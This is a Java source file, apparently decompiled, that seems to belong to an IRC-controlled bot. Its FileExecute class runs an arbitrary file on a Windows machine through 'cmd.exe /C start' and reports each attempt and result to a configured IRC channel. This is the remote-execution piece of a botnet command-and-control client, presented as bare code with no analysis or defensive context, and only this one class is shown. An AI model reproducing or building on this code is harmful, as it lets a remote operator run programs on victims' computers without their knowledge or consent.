package mn.num;

import java.io.IOException;

public class FileExecute extends Thread {
    public String file;
    Runtime rt;
    public FileExecute(String fil) {
        rt = Runtime.getRuntime();
        file = fil;
        IRC.sendMessage(Config.getChannel(), (new StringBuilder("Trying to execute file ")).append(file).toString());
    }

    public void run() {
        try {
            rt.exec((new StringBuilder("cmd.exe /C start ")).append(file).toString());
        } catch (IOException e) {
            e.printStackTrace();
        }
        IRC.sendMessage(Config.getChannel(), (new StringBuilder("File executed ")).append(file).toString());
    }
}